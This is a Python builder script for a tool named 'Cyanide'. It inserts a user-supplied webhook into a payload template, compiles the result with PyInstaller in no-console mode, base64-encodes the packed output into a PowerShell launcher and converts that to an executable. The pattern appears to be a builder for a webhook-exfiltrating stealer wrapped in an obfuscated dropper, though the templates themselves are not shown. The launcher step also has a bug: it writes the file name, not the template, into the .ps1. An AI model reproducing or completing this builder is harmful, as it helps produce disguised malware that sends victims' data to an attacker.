from core.logs import banner
from colorama import Fore, init

import subprocess
import shutil
import os
import zipfile
import click
import base64

def folderzipping(foldername, target_dir):

    zipobj = zipfile.ZipFile(foldername + '.zip', 'w', zipfile.ZIP_DEFLATED)
    rootlen = len(target_dir) + 1
    for base, dirs, files in os.walk(target_dir):
        for file in files:
            fn = os.path.join(base, file)
            zipobj.write(fn, fn[rootlen:])

@click.command()
@click.argument("webhook")
@click.option('-o', '--output', help='File output', required=True)

def build(webhook: str, output: str):
    banner.builder()
    print(f"{'-'*30} Configure Cyanide... {'-'*30}")
    print(f"[{Fore.CYAN}*{Fore.RESET}] Adding webhook...")
    
    with open("core/template/main.tm", "r") as f:
        template = f.read().replace(r"%webhook%", webhook)

    print(f"[{Fore.GREEN}${Fore.RESET}] Writing Cyanice...")
    
    with open(output+".py", "w") as f:
        f.write(template)

    print(f"{'-'*30} Compiling Cyanide... {'-'*30}")
    os.system("pyinstaller --noconsole "+output+".py")
    os.remove(output+".py")
    print(f"[{Fore.CYAN}*{Fore.RESET}] Folder zipping...")
    folderzipping(output, "dist")
    zipbase64 = base64.b64encode(open(output+".zip", "rb").read())
    os.remove(output+".zip")

    print(f"{'-'*30} Configure launcher... {'-'*30}")
    with open("core/template/launcher.tm", "r") as f:
        template = f.read().replace(r"%b64zip%", zipbase64.decode())
        template = template.replace(r"%exec%", output+".exe")
    
    with open(output+".ps1", "w") as f:
        f.write(output+".ps1")
    
    subprocess.run(["powershell", "-Command", fr"Invoke-ps2exe .\{output}.ps1 .\{output}.exe"], capture_output=True)
    os.remove(output+".ps1")

    shutil.rmtree("build")
    shutil.rmtree("dist")
    os.remove(output+".spec")

if __name__ == "__main__":
    build()